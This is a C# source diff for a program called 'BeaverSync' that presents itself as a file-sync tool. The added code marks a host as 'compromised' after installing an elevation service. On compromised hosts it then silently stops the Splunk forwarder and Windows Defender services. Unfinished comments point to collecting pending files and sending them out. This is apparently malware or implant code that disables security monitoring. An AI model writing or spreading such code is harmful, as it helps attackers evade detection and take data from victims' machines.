@@ -2,12 +2,16 @@
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
+using System.ServiceProcess;
 using VoidSerpent;
+using System.Collections.Generic;
 
 namespace BeaverSync
 {
     internal class Program
     {
+        private static DatabaseManager db;
+
         //[STAThread]
         static void Main(string[] args)
         {
@@ -22,6 +26,37 @@ namespace BeaverSync
             {
                 Console.WriteLine("Doing a sync!");
                 Console.ReadLine();
+
+                // Check if system has been beavered and try to stop services
+                string beavered = @"C:\ProgramData\BeaverSynced";
+                if (File.Exists(beavered))
+                {
+                    List<string> badSvcs = new List<string>
+                    {
+                        "SplunkForwarder",
+                        "WinDefend"
+                    };
+                    foreach (string svc in badSvcs)
+                    {
+                        try
+                        {
+                            // Create a new ServiceController instance for the specified service
+                            using (ServiceController service = new ServiceController(svc))
+                            {
+                                service.Stop();
+                            }
+                        }
+                        catch { }
+                    }
+                }
+                // need to open the database and go through the files and directory tables, sending everything in collected state and mark updated
+                var pending = db.PendingFiles();
+
+
+                // send the directory
+
+
+
             }
             else if (args.Length == 1 && args[0] == "register")
             {
@@ -64,6 +99,10 @@ namespace BeaverSync
                             string[] startSvc = { "start", "BeaverElevateSvc" };
                             Thread.Sleep(5000);
                             RunCmd("sc.exe", startSvc, false);
+
+                            // mark compromised
+                            string beavered = @"C:\ProgramData\BeaverSynced";
+                            File.Create(beavered).Close();
                         }
                         else
                         {
@@ -115,6 +154,12 @@ namespace BeaverSync
                     string[] uninst = { "/u", @"C:\Windows\BeaverElevateService.exe" };
                     RunCmd("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", uninst, false);
 
+                    // remove compfile if exists
+                    string beavered = @"C:\ProgramData\BeaverSynced";
+                    if (File.Exists(beavered))
+                    {
+                        File.Delete(beavered);
+                    }
                 }
             }
             else
